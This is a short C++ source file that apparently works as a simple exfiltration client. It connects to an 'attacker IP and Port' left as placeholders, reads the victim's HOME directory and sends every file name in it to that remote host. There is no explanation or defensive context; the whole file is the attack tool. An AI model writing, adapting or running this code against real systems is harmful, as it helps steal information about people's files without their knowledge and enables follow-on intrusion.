#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <iostream>
#include <stdlib.h>
#include <filesystem>
#include <sys/types.h>
#include <dirent.h>
using namespace std;



// Write attacker IP and Port below
#define PORT <port>
#define IP <ip>

int main(){

    int sock = 0, valread, client_fd;
    struct sockaddr_in serv_addr;
    char buffer[1024] = { 0 };
    
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, IP, &serv_addr.sin_addr)
        <= 0) {
        printf(
            "\nInvalid address/ Address not supported \n");
        return -1;
    }
    if ((client_fd
         = connect(sock, (struct sockaddr*)&serv_addr,
                   sizeof(serv_addr)))
        < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }
    //local variable
    const char* home = std::getenv("HOME");
    cout << "\nHome is " << home << endl;

    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(home)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(sock, ent->d_name, strlen(ent->d_name), 0);
            send(sock, "\n", 2, 0);
            memset(ent->d_name, 0, strlen(ent->d_name));
        }
        closedir(dir);
    }
    else {
        perror("");
    }

    //send(sock, out, strlen(*out), 0);
    valread = read(sock, buffer, 1024);
    printf("%s\n", buffer);
 
    // closing the connected socket
    close(client_fd);
    return 0;
}
